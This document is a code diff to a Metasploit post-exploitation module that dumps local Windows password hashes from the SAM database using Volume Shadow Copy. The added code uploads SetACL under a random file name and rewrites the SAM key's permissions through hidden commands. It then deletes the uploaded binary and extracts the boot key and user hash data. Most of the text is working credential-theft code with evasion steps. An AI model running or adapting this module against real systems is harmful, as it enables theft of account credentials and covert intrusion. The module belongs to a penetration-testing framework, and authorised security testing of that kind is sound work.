@@ -20,7 +20,10 @@ class Metasploit3 < Msf::Post
 			'Name'          => 'Windows Gather Local User Account Password Hashes (Registry) using VSS',
 			'Description'   => %q{
 					This module will dump the local user accounts from the SAM database using the
-					registry using Windows Volume Shadow Copy service.},
+					registry using Windows Volume Shadow Copy service. This is an alternative for
+					Windows Vista, 7 and 2008 where administrator token is available but systme
+					privileges to dump hashes are not. SetACL from http://helgeklein.com/ required.
+				},
 			'License'       => MSF_LICENSE,
 			'Author'        => [ 'hdm', 'Carlos Perez carlos_perez[at]darkoperator.com' ],
 			'Platform'      => [ 'windows' ],
@@ -62,13 +65,28 @@ class Metasploit3 < Msf::Post
 			# Make sure than a module error did not load them by mistake
 			registry_unloadkey("HKLM\\shdsys")
 			registry_unloadkey("HKLM\\shdsam")
-
+			
 			sysdrv = client.fs.file.expand_path("%SystemDrive%")
 			vs_path = create_shadow(sysdrv)
 			print_status("Created Volume Shadow Copy in #{vs_path}")
 			sam_loaded = registry_loadkey("HKLM\\shdsam","#{vs_path}\\WINDOWS\\system32\\config\\SAM")
 			print_status("Setting proper permissions on loaded SAM key")
-			puts cmd_exec("cmd","/c subinacl /subkeyreg HKLM\\shdsam\\SAM\\Domains\\Account /grant=%username% =F")
+			
+			# upload subinacls and ajust permissions on key to be able to read the SAM Key
+			if sysinfo['OS'] =~ /Windows 2008|7|Vista/
+				vprint_status("Uploading file SetACL")
+				on_trg = upload_subinacls
+				if not on_trg.empty?
+					# Changing permission on loaded SAM Registry key
+					vprint_status("Executing command to change permissions on SAM key")
+					exec_results = cmd_exec("cmd","/c #{on_trg} -on \"HKEY_LOCAL_MACHINE\\shdsam\" -ot reg -actn ace -ace \"n:Administrators;p:full;i:so;m:set\" -actn setprot -op \"dacl:np\" -actn clear -clr \"dacl\" -actn rstchldrn -rst \"dacl\"")
+					vprint_status(exec_results)
+					
+					# Removing file on target
+					vprint_status("Deleting #{on_trg}")
+					session.fs.file.rm(on_trg)
+				end
+			end
 			sys_loaded = registry_loadkey("HKLM\\shdsys","#{vs_path}\\WINDOWS\\system32\\config\\system")
 			if sys_loaded and sam_loaded
 				print_status("Obtaining the boot key...")
@@ -122,7 +140,6 @@ class Metasploit3 < Msf::Post
 		bootkey = ""
 		basekey = "shdsys\\ControlSet001\\Control\\Lsa"
 		%W{JD Skew1 GBG Data}.each do |k|
-			print_status(k)
 			ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, basekey + "\\" + k, KEY_READ)
 			return nil if not ok
 			bootkey << [ok.query_class.to_i(16)].pack("V")
@@ -164,11 +181,11 @@ class Metasploit3 < Msf::Post
 	#-----------------------------------------------------------------------------------------------
 	def capture_user_keys
 		users = {}
-		ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "shdsam\\SAM\\SAM\\Domains\\Account\\Users", KEY_READ)
+		ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "shdsam\\SAM\\Domains\\Account\\Users", KEY_READ)
 		return if not ok
 
 		ok.enum_key.each do |usr|
-			uk = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "shdsam\\SAM\\SAM\\Domains\\Account\\Users\\#{usr}", KEY_READ)
+			uk = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "shdsam\\SAM\\Domains\\Account\\Users\\#{usr}", KEY_READ)
 			next if usr == 'Names'
 			users[usr.to_i(16)] ||={}
 			users[usr.to_i(16)][:F] = uk.query_value("F").data
@@ -177,9 +194,9 @@ class Metasploit3 < Msf::Post
 		end
 		ok.close
 
-		ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "shd\\SAM\\SAM\\Domains\\Account\\Users\\Names", KEY_READ)
+		ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "shd\\SAM\\Domains\\Account\\Users\\Names", KEY_READ)
 		ok.enum_key.each do |usr|
-			uk = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "shd\\SAM\\SAM\\Domains\\Account\\Users\\Names\\#{usr}", KEY_READ)
+			uk = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "shd\\SAM\\Domains\\Account\\Users\\Names\\#{usr}", KEY_READ)
 			r = uk.query_value("")
 			rid = r.type
 			users[rid] ||= {}
@@ -326,7 +343,7 @@ class Metasploit3 < Msf::Post
 		begin
 			tmp = session.fs.file.expand_path("%TEMP%")
 			wmicfl = tmp + "\\"+ sprintf("%.5d",rand(100000))
-			print_status "running command wmic #{wmiccmd}"
+			vprint_status "running command wmic #{wmiccmd}"
 			r = session.sys.process.execute("cmd.exe /c %SYSTEMROOT%\\system32\\wbem\\wmic.exe /append:#{wmicfl} #{wmiccmd}", nil, {'Hidden' => true})
 			sleep(2)
 			#Making sure that wmic finishes before executing next wmic command
@@ -354,6 +371,33 @@ class Metasploit3 < Msf::Post
 		c = session.sys.process.execute("cmd.exe /c del #{wmicfl}", nil, {'Hidden' => true})
 		c.close
 		return tmpout
+	end
+	
+	# Upload subinacls
+	#-----------------------------------------------------------------------------------------------
+	def upload_subinacls
+		path_on_target = ""
+		tmpdir = session.fs.file.expand_path("%TEMP%")
+		
+		# randomize the exe name
+		tempexe_name = Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
+
+		# path to the subinacl binary
+		path = ::File.join(Msf::Config.install_root, "data", "post","SetACL.exe")
+		
+		if ::File.exists?(path)
+			session.fs.file.upload_file("%TEMP%\\"+tempexe_name, path)
+			sleep(2)
+			path_on_target = "#{tmpdir}\\"+tempexe_name
+			print_status("Executable uploaded")
+		else
+			print_error("setacl in not in your data folder")
+			print_error("Download and place the subinacl.exe in")
+			print_error(path)
+			print_error("Download from http://helgeklein.com/")
+		end
+		
+		return path_on_target
 	end
 end
 
